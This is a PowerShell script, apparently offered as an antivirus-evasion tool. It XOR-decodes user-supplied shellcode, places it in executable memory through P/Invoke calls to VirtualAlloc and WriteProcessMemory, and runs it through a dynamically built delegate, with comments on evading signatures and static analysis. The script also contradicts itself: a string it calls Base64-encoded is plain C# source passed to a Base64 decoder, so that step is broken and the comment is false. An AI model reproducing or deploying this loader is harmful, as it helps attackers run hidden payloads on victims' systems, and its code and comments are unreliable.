# Final Evasion Script - Replaced Reflection with Obfuscated P/Invoke
Set-StrictMode -Version 2
# Author @54N4l
# I used Base64 encoded to hide it from static analysis.
$b64_code = '
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
}
'
# The actual Add-Type call uses the decoded string, compiling the C# in memory.
Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_code)))
If ([IntPtr]::Size -eq 8) {
    # Replace %%DATA%% with your Base64 encoded, XOR-35 encrypted shellcode
    [Byte[]]$code = [System.Convert]::FromBase64String('%%DATA%%')
    for ($i = 0; $i -lt $code.Length; $i++) {
        $code[$i] = $code[$i] -bxor 35
    }
    # --- Execution using the new P/Invoke methods ---
    # 1. Allocate executable memory using our new Win32 class
    $mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $code.Length, 0x3000, 0x40)
    if ($mem -eq [IntPtr]::Zero) {
        Write-Error "Failed to allocate memory."
        return
    }
    # 2. Write the shellcode to the allocated memory
    $bytesWritten = [IntPtr]::Zero
    $success = [Win32]::WriteProcessMemory([IntPtr]::New(-1), $mem, $code, $code.Length, [ref]$bytesWritten)
    if (-not $success) {
        Write-Error "Failed to write shellcode to memory."
        return
    }
    # 3. Create a delegate and execute the shellcode in memory
    # This part of the technique is still very effective and less signatured than CreateThread.
    $delegate_type = ([AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]))
    $delegate_type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr])).SetImplementationFlags('Runtime, Managed')
    $delegate_type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [Void], @([IntPtr])).SetImplementationFlags('Runtime, Managed')
    
    $run_del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, $delegate_type.CreateType())
    $run_del.Invoke([IntPtr]::Zero)
}